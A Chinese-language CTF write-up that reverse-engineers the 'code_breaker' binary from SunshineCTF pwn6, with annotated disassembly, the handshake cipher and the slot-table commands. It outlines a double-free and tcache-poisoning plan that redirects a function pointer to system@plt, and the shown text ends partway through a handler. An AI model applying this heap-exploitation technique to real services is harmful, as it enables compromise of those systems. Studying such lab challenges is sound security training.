# SunshineCTF pwn6 — `code_breaker` 完整逆向與教學筆記

> 對象：**完全沒學過 ROP / pwn 的初學者**
> 所有位址、offset 都是本檔案用 `objdump -d -M intel code_breaker`、`readelf`、`ROPgadget`、
> 以及實際跑 `gdb`/本機測試**驗證過的**，沒有半個是猜的。
> 檔名：`/home/kzzz/Documents/code/ctf/sunshine/pwn6/notes.md`
>
> 📍 **完全沒學過 heap 的話**：先讀 `wp/99_速查表.md` §8（迷你版）與
> `../pwn4/notes.md` §5（完整版，含 gdb 實測的 heap 佈局表），
> 或至少先看本檔 §3.5（把 chunk / bin / tcache / safe-linking 用 20 行講完）。

---

## 0. 一句話總結

這是一個「自製加密 RPC 服務」的題目：

1. 它會從 `/dev/urandom` 讀 16 bytes 當 nonce，跟我們交換金鑰後，用一把**串流加密**
   溝通（每個 byte 都用 `S[(counter + i + K[i&0xf]) & 0xff]` 去 XOR）。
2. 它提供 7 個指令（0x10 ~ 0x16），是一套「**堆積物件管理器**」：配置/讀/寫/釋放/複製（clone）。
3. 「**複製（clone）時引用計數（refcount）算錯**」⇒ 同一塊 chunk 會被 `free()` 兩次
   ⇒ **double free + use-after-free**。
4. 用 tcache poisoning 把「下一次 malloc 會回傳的位址」改成 `.bss` 裡的函式指標
   `[PIE+0x40c0]`，再把 `system@plt` 寫進去。
5. 指令 `0x15` 會執行 `call qword ptr [0x40c0]`，而 `rdi` 正是我們送的字串
   ⇒ 直接變成 `system("cat flag.txt ...")` ⇒ 得到 shell/旗標。

**完全不需要 ROP chain**（但筆記第 5 節仍然從零教你 ROP/SROP，因為那是必備知識）。

---

## 1. 題目資訊與保護機制

### 1.1 檔案

```
code_breaker          14640 bytes  ELF 64-bit LSB **pie** executable, x86-64, stripped
libc.so.6           2125328 bytes  GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.3)
ld-linux-x86-64.so.2  236616 bytes  對應的動態連結器
```

`readelf -d code_breaker`：

```
 0x0000000000000001 (NEEDED)  Shared library: [libc.so.6]
 0x000000000000001d (RUNPATH) Library runpath: [$ORIGIN]     <-- 關鍵！
```

### 1.2 保護機制總表

| 保護 | 有沒有 | 怎麼看出來 | 對解題的影響 |
|---|---|---|---|
| **PIE** | 有 | `readelf -h` → `Type: DYN`，`Entry point 0x12a0` | 程式碼/全域變數位址每次執行都不同，必須先 **leak PIE base** 才能算 `.bss`、`system@plt` 的位址 |
| **Canary** | 有 | `mov rax, qword ptr fs:0x28` + `__stack_chk_fail` | 想覆蓋 return address 就必須先洩漏 canary，否則 `__stack_chk_fail` 會 abort |
| **NX** | 有 | `GNU_STACK ... RW`（沒有 E） | 堆疊不可執行，不能把 shellcode 放到 stack 上跑 → 要走 ROP / ret2libc 這條路 |
| **Partial RELRO** | 有 | `GNU_RELRO 0x3da8 size 0x258` → 只保護到 `0x4000`；`.got.plt` 在 `0x3fe8`，函式 GOT 在 `0x4000` 之後 | `.got.plt`（例如 `system@0x4028`）**可以寫**，可以 GOT overwrite |
| **ASLR** | 有 | 系統預設 | 所有 base 每次都不一樣，一樣要靠 leak |
| **SHSTK / IBT (CET)** | 標記有、**實際沒開** | `.note.gnu.property: x86 feature: IBT, SHSTK`，每個函式開頭與 PLT 都是 `endbr64` | 本題在一般 Linux 上沒有被強制啟用；而且我們跳去的 `system@plt` 開頭就是 `endbr64`，即使開了 IBT 也能過 |
| **glibc 版本** | 2.39 | `strings libc.so.6 \| grep 'GNU C Library'` | 有 **tcache**、有 **safe-linking**（指標會跟 `位址>>12` 做 XOR）、`tcache_key` 是隨機值（不是指標）⇒ 影響 heap 攻擊手法 |

### 1.3 怎麼執行它（重要！）

題目附了自己的 `libc.so.6`（2.39）跟 `ld-linux-x86-64.so.2`，但 ELF 的 interpreter 寫的是
`/lib64/ld-linux-x86-64.so.2`（系統的）。直接 `./code_breaker` 會用系統 ld 去載入
題目的 libc，結果：

```
./code_breaker: ./libc.so.6: undefined symbol: __nptl_change_stack_perm, version GLIBC_PRIVATE
```

因為 **ld 與 libc 是一對的，不能混搭**。正確跑法（也是 pwntools 用的）：

```python
process(['./ld-linux-x86-64.so.2', '--library-path', '.', './code_breaker'])
```

（`RUNPATH=$ORIGIN` 只是告訴程式去哪找 libc，**不能**改變「用哪個 ld」。）

---

## 2. 逐行組語解說（從零開始）

### 2.1 先認識 16 個通用暫存器

x86-64 有 16 個 64-bit 通用暫存器，寫法/用途：

| 64-bit | 低 32 | 低 16 | 低 8 | 傳統用途（System V AMD64 ABI） |
|---|---|---|---|---|
| `rax` | `eax` | `ax` | `al` | **函式回傳值**；syscall 編號；乘除法 |
| `rbx` | `ebx` | `bx` | `bl` | 被呼叫者保存（callee-saved），常當迴圈計數/指標 |
| `rcx` | `ecx` | `cx` | `cl` | 第 4 個參數；迴圈計數（`rep` 也用） |
| `rdx` | `edx` | `dx` | `dl` | 第 3 個參數；乘除法高位 |
| `rsi` | `esi` | `si` | `sil` | **第 2 個參數** |
| `rdi` | `edi` | `di` | `dil` | **第 1 個參數** |
| `rbp` | `ebp` | `bp` | `bpl` | frame pointer（本題被當一般暫存器用） |
| `rsp` | `esp` | `sp` | `spl` | **堆疊指標**（指向堆疊頂端） |
| `r8`~`r15` | `r8d`~`r15d` | `r8w`~`r15w` | `r8b`~`r15b` | 第 5、6 個參數是 `r8`、`r9`，其餘 callee-saved |

> 命名規則：`e` 開頭 = 32-bit，`r` 開頭 = 64-bit，`w` = 16-bit，`b`/`l` = 8-bit。

### 2.2 System V AMD64 呼叫慣例（本題大量依賴）

呼叫 `foo(a, b, c, d, e, f, g)` 時：

```
rdi = a , rsi = b , rdx = c , rcx = d , r8 = e , r9 = f , 第 7 個以後「從右往左」push 到 stack
回傳值放在 rax
```

而且 **`call` 會把返回位址 push 到 stack**，進入函式時 `rsp % 16 == 8`（所以函式一開頭通常
`push rbp` 讓它變 16 對齊）。這件事在第 5.4 節（`movaps` 崩潰）非常重要。

### 2.3 常用指令速查（本題真的會用到的）

| 指令 | 中文解釋 |
|---|---|
| `mov dst, src` | 複製（把 src 的值放到 dst） |
| `lea dst, [base+index*scale+disp]` | **只做位址計算，不存記憶體**。常用 `lea rax,[rip+X]` 取「字串位址」，`lea eax,[r9-1]` 拿來做減法 |
| `add` / `sub` | 加 / 減 |
| `xor a, a` | 自己跟自己 XOR ⇒ 0（也是最短的「清零」寫法） |
| `cmp a, b` | 做 `a - b` 但只更新旗標（不存結果）→ 配 `je/jne/ja/jb/jg/jl` |
| `test a, b` | 做 AND 但只更新旗標 → `test rax,rax; js` 就是「rax 是負數嗎」 |
| `jmp` | 無條件跳 |
| `jcc` | 條件跳（`je`=相等、`jne`=不等、`ja/`jb`=無號大/小、`jg/jl`=有號大/小、`js`=負、`jge`=有號 ≥） |
| `call` | push 返回位址 + 跳 |
| `ret` | pop 返回位址 + 跳（**ROP 的核心**） |
| `push` / `pop` | 把值放上/拿下 stack（`rsp` 同時 -8/+8） |
| `leave` | 等於 `mov rsp,rbp; pop rbp`（本題沒用到，但要知道） |
| `movzx dst, src` | 把**小**的值**零擴展**到大（例：`movzx r15d, dx` 把 16-bit 讀成 32-bit 且高位補 0） |
| `movsxd` | 有號擴展（例：`movsxd rax, dword [rbp+rax*4]` 把 32-bit 有號位移讀成 64-bit） |
| `cdqe` | 把 `eax` 有號擴展成 `rax` |
| `imul` | 有號乘法 |
| `shl`/`shr`/`sar` | 左移/邏輯右移/算術右移 |
| `rol`/`ror` | 循環移位（本題用 `rol al,3` 做加密） |
| `movdqa`/`movaps`/`movups`/`movdqu` | SSE 一次搬 16 bytes；`dqa`/`aps` 要求 **16-byte 對齊**，沒對齊會 `#GP` → 程式掛掉 |
| `endbr64` | CET 的合法跳轉入口標記，本身不做任何事 |

### 2.4 `_start`：程式從哪裡開始？

```
00000000000012a0 <.text+0xe0>:
    12a0: f3 0f 1e fa          endbr64
    12a4: 31 ed                xor    ebp,ebp                    ; rbp = 0 (最外層 frame)
    12a6: 49 89 d1             mov    r9,rdx                     ; r9 = rtld_fini
    12a9: 5e                   pop    rsi                        ; rsi = argc
    12aa: 48 89 e2             mov    rdx,rsp                    ; rdx = argv
    12ad: 48 83 e4 f0          and    rsp,0xfffffffffffffff0     ; 16-byte 對齊
    12b1: 50                   push   rax
    12b2: 54                   push   rsp
    12b3: 45 31 c0             xor    r8d,r8d                    ; r8 = fini = 0
    12b6: 31 c9                xor    ecx,ecx                    ; rcx = init = 0
    12b8: 48 8d 3d 01 ff ff ff lea    rdi,[rip+0xffffffffffffff01]  # 11c0  <-- main!
    12bf: ff 15 fb 2c 00 00    call   QWORD PTR [rip+0x2cfb]      # 3fc0  <-- __libc_start_main
    12c5: f4                   hlt
```

**找 `main` 的方法**：`__libc_start_main(main, argc, argv, init, fini, rtld_fini, stack_end)`，
第一個參數是 `rdi`。這裡 `lea rdi,[rip-0xff]` 算出 `0x11c0` ⇒ **`main = 0x11c0`**。

### 2.5 PLT / GOT 與 lazy binding

```
0000000000001150 <system@plt>:
    1150: f3 0f 1e fa          endbr64
    1154: ff 25 ce 2e 00 00    jmp    QWORD PTR [rip+0x2ece]   # 4028   <-- system 的 GOT 項
    115a: 66 0f 1f 44 00 00    nop    WORD PTR [rax+rax*1+0x0]
```

- **GOT (.got.plt)**：一張「函式指標表」。`0x4028` 這格（= `system` 的 GOT 項）第一次被
  呼叫前指向的是 **PLT0 + stub** 的模式（`0x1020` 是 PLT0：`push [GOT+8]; jmp [GOT+16]`），
  會去呼叫動態連結器把真的 libc `system` 位址填進去（**lazy binding**），之後就直接跳。
  每個函式的 stub 固定 0x10 bytes：`system` 是**第 6 個** JUMP_SLOT
  （`0x4028 = 0x4000 + 5*8`），所以它自己的 stub 在 **`0x1080`**（`0x1030 + 5*0x10`），
  內容是 `push 0x5; jmp 0x1020`。
  （`0x1030` 是**第 1 個** JUMP_SLOT，也就是 `free` 的 stub —— 別認錯。）
- **PLT**：一段「跳板」，把 `call system@plt` 轉成「跳到 GOT 裡記的位址」。
- 對攻擊者的意義：`system@plt` 這個位址**從頭到尾固定**（PIE base + 0x1150），
  所以只要知道 PIE base，就能拿到「一個能呼叫 system 的位址」。
- 本題 `main` 一開始就呼叫了 `system("true")`（見 2.6），所以 `system` 的 GOT 早就被解析好了。

### 2.6 `main`（0x11c0）逐行

```
00000000000011c0 <main>:
    11c0: f3 0f 1e fa          endbr64
    11c4: 48 83 ec 08          sub    rsp,0x8            ; 對齊
    11c8: 48 8d 3d 44 0e 00 00 lea    rdi,[rip+0xe44]   # 2013  -> "true"
    11cf: e8 7c ff ff ff       call   1150 <system@plt> ; system("true")  <== 作者故意的「禮物」
    11d4: 66 0f 6f 05 64 0f 00 movdqa xmm0,[rip+0xf64]  # 2140  -> "CodeBreaker\0\0\0\0"
    11dc: 48 8d 05 ad 01 00 00 lea    rax,[rip+0x1ad]   # 1390  -> endbr64; ret  (空函式 stub)
    11e3: 31 d2                xor    edx,edx
    11e5: 48 89 05 d4 2e 00 00 mov    [rip+0x2ed4],rax  # 40c0  ; *把 stub 存進全域函式指標*
    11ec: 48 b8 32 2e 31 2e 34 movabs rax,0x342e312e32       ; "2.1.4"
    11f6: 0f 11 05 cb 2e 00 00 movups [rip+0x2ecb],xmm0 # 40c8  ; 40c8 = "CodeBreaker"
    11fd: 66 0f ef c0          pxor   xmm0,xmm0               ; xmm0 = 0
    1201: 48 89 15 08 2f 00 00 mov    [rip+0x2f08],rdx  # 4110  ; 清零
    1208: 0f 11 05 d9 2e 00 00 movups [rip+0x2ed9],xmm0 # 40e8
    120f: 48 89 05 f2 2e 00 00 mov    [rip+0x2ef2],rax  # 4108  ; "2.1.4" 版本字串
    1216: c7 05 08 2f 00 00 30 mov    DWORD [rip+0x2f08],0x30 # 4128
    1220: 0f 11 05 b1 2e 00 00 movups [rip+0x2eb1],xmm0 # 40d8
    1227: 0f 11 05 c9 2e 00 00 movups [rip+0x2ec9],xmm0 # 40f7
    122e: 0f 11 05 e2 2e 00 00 movups [rip+0x2ee2],xmm0 # 4117
    1235: e8 36 04 00 00       call   1670                ; 握手 handshake
    123a: 89 c2                mov    edx,eax
    123c: b8 01 00 00 00       mov    eax,0x1
    1241: 85 d2                test   edx,edx
    1243: 78 07                js     124c                ; 握手失敗 -> 直接結束
    1245: e8 b6 06 00 00       call   1900                ; 指令主迴圈
    124a: 31 c0                xor    eax,eax
    124c: 48 83 c4 08          add    rsp,0x8
    1250: c3                   ret
```

重點：**`0x40c0` = 一個「函式指標」，預設值是 `0x1390`（`endbr64; ret`，等於什麼都不做）**。
後面指令 `0x15` 會 `call [0x40c0]`。這就是我們的攻擊目標。

`.rodata`（`objdump -s -j .rodata`）告訴我們字串位置：

```
 2000 01000200 72002f64 65762f75 72616e64   ....r./dev/urand
 2010 6f6d0074 72756500 ...                 om.true.
 2020 30fcffff a0fbffff 20fbffff c8faffff   <-- 0x16~0x10 指令的 jump table
 2030 60faffff e0f9ffff e8fcffff 00000000
 2040 b782bfe0 ...  (256 bytes 的 S-box)
 2140 436f6465 42726561 6b657200            "CodeBreaker"
```

另外 `0x2004` 是 `"r"`（fopen 的模式），`0x2006` 是 `"/dev/urandom"`。

### 2.7 讀/寫底層：`read_exact`(0x13a0) 與 `send`(0x1450)

```
00000000000013a0 <.text+0x1e0>:            ; int read_exact(void *buf /*rdi*/, size_t n /*rsi*/)
    13a0: 41 54              push   r12
    13a2: 49 89 fc           mov    r12,rdi              ; r12 = buf
    13a5: 55                 push   rbp
    13a6: 48 89 f5           mov    rbp,rsi              ; rbp = n
    13a9: 53                 push   rbx
    13aa: 31 db              xor    ebx,ebx              ; rbx = 已讀長度 = 0
    13ac: eb 0a              jmp    13b8
    13b0: 48 01 c3           add    rbx,rax              ; 已讀 += read() 的回傳值
    13b3: 48 39 eb           cmp    rbx,rbp
    13b6: 73 28              jae    13e0                 ; 讀滿了 -> return 0
    13b8: 48 89 ea           mov    rdx,rbp
    13bb: 31 ff              xor    edi,edi              ; rdi = 0  (fd 0 = stdin)
    13bd: 49 8d 34 1c        lea    rsi,[r12+rbx*1]      ; rsi = buf + 已讀
    13c1: 48 29 da           sub    rdx,rbx              ; rdx = n - 已讀
    13c4: e8 97 fd ff ff     call   1160 <read@plt>      ; read(0, buf+off, n-off)
    13c9: 48 85 c0           test   rax,rax
    13cc: 7f e2              jg     13b0                 ; >0 繼續；<=0 -> return -1
```

⇒ **這是一個「讀好讀滿」函式，短讀（short read）不會破壞協定**，TCP 分段也沒關係。

`0x1450` 則是「**寫一封訊息**」：先把長度做 `rol ax,8`（**host → big-endian**），
寫 2 bytes 長度前綴，再寫資料。（`0x1510` 是「加密後再呼叫 0x1450」的版本。）

### 2.8 指令協定與解密迴圈（0x1900）

訊息格式（全部 **big-endian**）：

```
+--------+--------+-----------------------------------+
| len_hi | len_lo | payload (len bytes, 已被串流加密)  |
+--------+--------+-----------------------------------+
```

`payload[0]` = 指令碼，`payload[1..]` = 參數。

主迴圈（`0x1900`）先配置 0x3000+0x48 bytes 的 stack frame，並放上 canary：

```
    190a: 48 81 ec 00 10 00 00 sub rsp,0x1000      ; 大 stack frame（每 0x1000 一次
    1911: 48 83 0c 24 00       or  QWORD PTR [rsp],0x0   ; 是 glibc 的 stack probe，
    ... 重複三次 ...                                       ; 用來「摸」每一頁避免跳頁）
    192e: 48 83 ec 48          sub    rsp,0x48
    1932: 4c 8d 25 07 07 00 00 lea    r12,[rip+0x707]   # 2040  ; r12 = S-box
    1939: 4c 8d 35 90 29 00 00 lea    r14,[rip+0x2990]  # 42d0  ; r14 = K（16-byte 金鑰表）
    1940: 48 8d 2d d9 06 00 00 lea    rbp,[rip+0x6d9]   # 2020  ; rbp = jump table
    1947: 64 48 8b 04 25 28 00 00 00   mov rax,QWORD PTR fs:0x28   ; ← canary 讀出
    1950: 48 89 84 24 38 30 00 00      mov [rsp+0x3038],rax        ; ← 存到 rsp+0x3038
    1958: 31 c0                xor    eax,eax
    195a: 48 8d 44 24 2c       lea    rax,[rsp+0x2c]            ; &len
    195f: 48 8d 5c 24 30       lea    rbx,[rsp+0x30]            ; 訊息緩衝區 msg = rsp+0x30
    1964: 48 89 44 24 08       mov    [rsp+0x8],rax
    1970: 48 8b 74 24 08       mov    rsi,[rsp+0x8]
    1975: 48 89 df             mov    rdi,rbx
    1978: e8 73 fa ff ff       call   13f0                      ; 收一封訊息
    197d: 85 c0                test   eax,eax
    197f: 0f 88 97 04 00 00    js     1e1c                      ; 連線結束 -> 離開
    1985: 44 0f b7 6c 24 2c    movzx  r13d,WORD PTR [rsp+0x2c]     ; r13 = len
    198b: 66 45 85 ed          test   r13w,r13w
    198f: 74 df                je     1970                      ; len==0 就再收
    ; ---- 解密（串流密碼） ----
    1991: 44 8b 0d 28 29 00 00 mov    r9d,DWORD PTR [rip+0x2928] # 42c0  ; C = 收方計數器
    1998: 48 89 da             mov    rdx,rbx                   ; rdx = msg
    199b: 31 c9                xor    ecx,ecx                   ; i = 0
    199d: 44 89 cf             mov    edi,r9d
    19a0: 29 df                sub    edi,ebx                   ; edi = C - (msg 的低 32 位)
    19a8: 48 89 ce             mov    rsi,rcx                   ; rsi = i
    19ab: 8d 04 17             lea    eax,[rdi+rdx]             ; eax = (C - msg) + (msg+i) = C+i
    19ae: 83 c1 01             add    ecx,0x1
    19b1: 83 e6 0f             and    esi,0xf                   ; i & 0xf   <== 注意：用「訊息內」的索引
    19b4: 41 02 04 36          add    al,BYTE PTR [r14+rsi*1]   ; al += K[i & 0xf]
    19b8: 0f b6 c0             movzx  eax,al
    19bb: 41 0f b6 04 04       movzx  eax,BYTE PTR [r12+rax*1] ; al = S[(C+i+K[i&0xf]) & 0xff]
    19c0: 30 02                xor    BYTE PTR [rdx],al         ; msg[i] ^= al
    19c2: 48 83 c2 01          add    rdx,0x1
    19c6: 66 44 39 e9          cmp    cx,r13w
    19ca: 72 dc                jb     19a8
    ; ---- 更新計數器 & 分派 ----
    19cc: 41 8d 55 ff          lea    edx,[r13-0x1]             ; edx = len-1
    19d0: 0f b6 4c 24 30       movzx  ecx,BYTE PTR [rsp+0x30]     ; cl = 指令碼
    19d5: 44 0f b7 fa          movzx  r15d,dx                   ; r15 = len-1
    19d9: 43 8d 44 39 01       lea    eax,[r9+r15*1+0x1]
    19de: 89 05 dc 28 00 00    mov    [rip+0x28dc],eax          # 42c0  ; 計數器 += len
    19e4: 8d 41 f0             lea    eax,[rcx-0x10]            ; 指令碼 - 0x10
    19e7: 3c 06                cmp    al,0x6
    19e9: 0f 87 52 04 00 00    ja     1e41                      ; 不在 0x10~0x16 -> 錯誤回應
    19ef: 0f b6 c0             movzx  eax,al
    19f2: 48 63 44 85 00       movsxd rax,DWORD PTR [rbp+rax*4+0x0]  ; 讀 jump table 的 32-bit 位移
    19f7: 48 01 e8             add    rax,rbp                   ; 目標 = 0x2020 + 位移
    19fa: 3e ff e0             notrack jmp rax                   ; 跳過去！
```

**加密公式（本題最關鍵的數學）**：

```
keystream(C, i) = S[ (C + i + K[i & 0xf]) & 0xff ]
msg[i] ^= keystream(C, i)
```

- `C` = 這封訊息開始時的全域計數器（收/送各有一個：`0x42c0` 收、`0x42c4` 送）
- `i` = **訊息內的** byte 索引（0 開始）⇒ **`K` 的索引用 `i & 0xf`，不是 `(C+i) & 0xf`**！
  （這裡我第一次逆錯，導致指令只有第 0 個 byte 解得對、後面全錯，花了很久才抓到。切記！）
- `S` = `.rodata 0x2040` 那 256 bytes 的表，`K` = 握手算出來的 16 bytes 金鑰表

由於兩邊的計數器都從 0 起算且都用「已處理 byte 數」，**加密與解密是同一個函式**。

指令 jump table（`0x2020`，每個是 4-byte 有號位移，基準是 `0x2020`）：

| 指令 | 位移 | 處理函式 | 功能 |
|---|---|---|---|
| `0x10` | `-0x3d0` | `0x1c50` | alloc：`malloc(size)`，存進 slot |
| `0x11` | `-0x460` | `0x1bc0` | read：把 slot 的資料傳回給我們 |
| `0x12` | `-0x4e0` | `0x1b40` | write：把資料寫進 slot（**上限 = slot.size**） |
| `0x13` | `-0x538` | `0x1ae8` | free：`free(slot.ptr)` 並把 refcount -1 |
| `0x14` | `-0x5a0` | `0x1a80` | clone：把 slot B 複製到空的 slot A（**本題漏洞在這裡**） |
| `0x15` | `-0x620` | `0x1a00` | call：`call [0x40c0](我們的字串)` |
| `0x16` | `-0x318` | `0x1d08` | dump：把 `0x40c0` 起 240 bytes 傳回來（**PIE leak**） |

### 2.9 握手（0x1670）：金鑰交換與驗證

```
    1688: 48 8d 35 75 09 00 00 lea rsi,[rip+0x975]  # 2004 -> "r"
    168f: 48 8d 3d 70 09 00 00 lea rdi,[rip+0x970]  # 2006 -> "/dev/urandom"
    16a9: e8 02 fb ff ff       call 11b0 <fopen@plt>
    16ae: 48 85 c0             test rax,rax
    16b1: 0f 84 f9 01 00 00    je   18b0                    ; 開不起來就失敗
    16b7: 48 8d 7c 24 10       lea  rdi,[rsp+0x10]           ; buf
    16bc: 48 89 c1             mov  rcx,rax                  ; FILE *
    16bf: ba 10 00 00 00       mov  edx,0x10                 ; nmemb = 16
    16c7: be 01 00 00 00       mov  esi,0x1                  ; size = 1
    16cc: e8 3f fa ff ff       call 1110 <fread@plt>        ; fread(buf,1,16,fp)
    16d4: 48 83 f8 10          cmp  rax,0x10
    16d8: 0f 85 0e 02 00 00    jne  18ec                     ; **短讀就失敗**（沒有 uninit 洩漏）
    16e3: 48 8d 5c 24 40       lea  rbx,[rsp+0x40]
    16f6: c6 44 24 40 01       mov  BYTE PTR [rsp+0x40],0x1  ; 標籤 = 1
    16fb: 0f 11 4c 24 41       movups [rsp+0x41],xmm1        ; 16 bytes nonce
    1700: e8 4b fd ff ff       call 1450                     ; 明文送出：01 || Ns
    1718: e8 d3 fc ff ff       call 13f0                     ; 收我們回覆
    1725: 66 83 7c 24 0c 10    cmp  WORD PTR [rsp+0xc],0x10
    172b: 0f 86 7f 01 00 00    jbe  18b0                     ; 長度必須 > 16
    1731: 80 7c 24 40 02       cmp  BYTE PTR [rsp+0x40],0x2  ; 標籤必須 = 2
    1736: 0f 85 74 01 00 00    jne  18b0
```

然後是金鑰排程（4 輪 × 16 bytes）：

```
    1776: 0f 29 54 24 20       movaps [rsp+0x20],xmm2        ; buf[0..15]  = Ns（伺服器 nonce）
    177b: 0f 29 5c 24 30       movaps [rsp+0x30],xmm3        ; buf[16..31] = Nc（我們送的 nonce）
    1790: 8d 14 06             lea    edx,[rsi+rax*1]        ; 索引 (j + 8*r) & 0x1f
    1793: 48 83 c0 01          add    rax,0x1
    1797: 48 83 c1 01          add    rcx,0x1
    179b: 83 e2 1f             and    edx,0x1f
    179e: 0f b6 54 14 20       movzx  edx,BYTE PTR [rsp+rdx*1+0x20]
    17a3: 32 50 ff             xor    dl,BYTE PTR [rax-0x1]  ; ^ K[j]
    17a6: 0f b6 d2             movzx  edx,dl
    17a9: 0f b6 54 15 00       movzx  edx,BYTE PTR [rbp+rdx*1+0x0] ; S[...]
    17ae: 32 51 ff             xor    dl,BYTE PTR [rcx-1]    ; ^ buf[3r+j]
    17b1: c0 c2 03             rol    dl,0x3
    17b4: 88 50 ff             mov    BYTE PTR [rax-0x1],dl  ; K[j] = rol8(S[buf[..]^K[j]] ^ buf[3r+j], 3)
    17b7: 48 39 c7             cmp    rdi,rax
    17ba: 75 d4                jne    1790
    17bc: 41 83 c0 03          add    r8d,0x3
    17c0: 49 83 c1 03          add    r9,0x3                 ; buf 前進 3
    17c4: 83 c6 08             add    esi,0x8
    17c7: 41 83 f8 0c          cmp    r8d,0xc
    17cb: 75 b3                jne    1780                   ; 共 4 輪
```

Python 等價：

```python
K = [0]*16
buf = Ns + Nc                       # 32 bytes
for r in range(4):
    for j in range(16):
        K[j] = rol8(S[buf[(j + 8*r) & 0x1f] ^ K[j]] ^ buf[3*r + j], 3)
```

接著把兩個計數器歸零、收第三封訊息（標籤 3 + 16 bytes 驗證碼）：

```
    17cd: c7 05 ed 2a 00 00 00 mov DWORD PTR [rip+0x2aed],0x0  # 42c4   ; 送方計數器 = 0
    17dd: c7 05 d9 2a 00 00 00 mov DWORD PTR [rip+0x2ad9],0x0  # 42c0   ; 收方計數器 = 0
    17e7: e8 04 fc ff ff       call 13f0
    1844: 66 83 fe 10          cmp  si,0x10
    1848: 76 66                jbe  18b0                           ; len > 16
    184a: 80 7c 24 40 03       cmp  BYTE PTR [rsp+0x40],0x3         ; 標籤 = 3
    184f: 75 5f                jne  18b0
    1851: c6 44 24 0e 04       mov  BYTE PTR [rsp+0xe],0x4          ; 回應：04 ?? 
    1860: 41 0f b6 0c 04       movzx ecx,BYTE PTR [r12+rax*1]       ; K[i]
    1865: 8d 50 05             lea  edx,[rax+0x5]
    1868: 83 e2 0f             and  edx,0xf
    186b: 41 0f b6 14 14       movzx edx,BYTE PTR [r12+rdx*1]       ; K[(i+5)&0xf]
    1870: 32 54 0d 00          xor  dl,BYTE PTR [rbp+rcx*1+0x0]      ; ^ S[K[i]]
    1874: 41 88 54 05 00       mov  BYTE PTR [r13+rax*1+0x0],dl      ; 期望值[i]
    188d: 48 33 44 24 20       xor  rax,QWORD PTR [rsp+0x20]
    1897: 48 09 d0             or   rax,rdx
    189a: 74 3a                je   18d6                           ; 全部相同 -> 成功
```

所以我們必須送：`0x03 || (S[K[i]] ^ K[(i+5)&0xf]) for i in 0..15`（整封用 counter=0 加密）。

握手完成後：**收方計數器 = 17**（第三封訊息 17 bytes），**送方計數器 = 2**（回應 `04 00`）。
之後每一封訊息 `計數器 += 訊息長度`，所以兩邊都把「絕對 byte offset」當作 stream position。

### 2.10 物件槽（slot table）與指令細節

`0x41c0` 開始是 **16 個 slot，每個 16 bytes**：

```
struct slot {          // 共 0x10 bytes
    void *ptr;         // +0x00  malloc 回來的指標
    u16   size;        // +0x08  這塊記憶體的大小（<= 0x400）
    u16   refcount;    // +0x0a  引用計數（= 有幾個 slot 指向它）
    /* +0x0c..0x0f padding */
};
```

**`0x10` alloc（0x1c50）**：檢查 `len>3`、`index<=0xf`、slot 必須是空的、
`size` 為 big-endian 的 2 bytes、`1 <= size <= 0x400`、`size+2 < len-1`，
然後 `malloc(size)` + `__memcpy_chk(malloc_ptr, msg+4, size, size)`（**destlen = size，
所以不可能溢位**），最後 `slot.ptr=ptr; slot.size=size; slot.refcount=1`。

**`0x11` read（0x1bc0）**：把 `slot.size` bytes 從 `slot.ptr` 複製到回應緩衝區送出，
長度前綴會蓋在回應裡。（**沒有檢查是不是已釋放** ⇒ UAF read！）

**`0x12` write（0x1b40）**：`memcpy(slot.ptr, msg+4, n)`，但 `n` 被 `slot.size` 限制住
（`cmp WORD PTR [rdx+0x8],ax; jb 錯誤`）⇒ 單獨看**不是** heap overflow。

**`0x13` free（0x1ae8）**：

```
    1b10: 49 8b 7d 00          mov    rdi,QWORD PTR [r13+0x0]   ; rdi = slot.ptr
    1b14: 48 85 ff             test   rdi,rdi
    1b17: 74 b7                je     1ad0                     ; 空的 -> 錯誤
    1b19: e8 e2 f5 ff ff       call   1100 <free@plt>          ; free(slot.ptr)
    1b1e: 66 41 83 6d 0a 01    sub    WORD PTR [r13+0xa],0x1   ; refcount--
    1b24: 75 0d                jne    1b33                     ; 還有引用 -> 「保留 ptr」
    1b26: 31 f6                xor    esi,esi
    1b28: 66 41 c7 45 08 00 00 mov    WORD PTR [r13+0x8],0x0   ; size = 0
    1b2f: 49 89 75 00          mov    QWORD PTR [r13+0x0],rsi  ; ptr  = NULL
```

**`0x14` clone（0x1a80）**：

```
    1a90: 0f b6 54 24 31       movzx  edx,BYTE PTR [rsp+0x31]     ; A = msg[1]（目的，必須是空的）
    1a95: 0f b6 44 24 32       movzx  eax,BYTE PTR [rsp+0x32]     ; B = msg[2]（來源，必須非空）
    1ab1: 48 8b 30             mov    rsi,QWORD PTR [rax]         ; rsi = slot[B].ptr
    1ab4: 48 85 f6             test   rsi,rsi
    1ab7: 74 17                je     1ad0                        ; B 是空的 -> 錯誤
    1ac0: 48 83 39 00          cmp    QWORD PTR [rcx],0x0
    1ac4: 0f 84 94 03 00 00    je     1e5e                        ; A 是空的 -> 進複製
   ...
    1e5e: 0f b7 50 08          movzx  edx,WORD PTR [rax+0x8]       ; edx = slot[B].size
    1e62: 66 c7 41 0a 01 00    mov    WORD PTR [rcx+0xa],0x1      ; slot[A].refcount = 1  ←！！ 
    1e68: 48 89 31             mov    QWORD PTR [rcx],rsi         ; slot[A].ptr = slot[B].ptr
    1e6b: 66 83 40 0a 01       add    WORD PTR [rax+0xa],0x1      ; slot[B].refcount++    ←！！
    1e70: 66 89 51 08          mov    WORD PTR [rcx+0x8],dx       ; slot[A].size = slot[B].size
```

問題就在 `1e62` 與 `1e6b`：**兩個 slot 共用同一塊記憶體，卻各自保有自己的 refcount**。
這不是「共用計數」，而是「各自數自己的」⇒ 見第 4 節。

### 2.11 指令 0x15 與指令 0x16

```
0000000000001a00 <cmd 0x15 handler>:
    1a00: 48 8d 74 24 31       lea    rsi,[rsp+0x31]            ; src = msg+1
    1a05: 0f b7 d2             movzx  edx,dx                     ; n = len-1
    1a08: b9 00 10 00 00       mov    ecx,0x1000                ; 目的大小 = 0x1000
    1a0d: 48 8d bc 24 30 10 00 00  lea rdi,[rsp+0x1030]         ; dest = rsp+0x1030
    1a15: 48 89 54 24 18       mov    [rsp+0x18],rdx            ; 存 n
    1a1a: 48 89 74 24 10       mov    [rsp+0x10],rsi            ; 存 src
    1a1f: e8 4c f7 ff ff       call   1170 <__memcpy_chk@plt>   ; 安全：n <= 0xfff 且 dest 有 0x1000
    1a24: 42 c6 84 3c 30 10 00 00  mov BYTE PTR [rsp+r15*1+0x1030],0x0  ; 補 '\0'
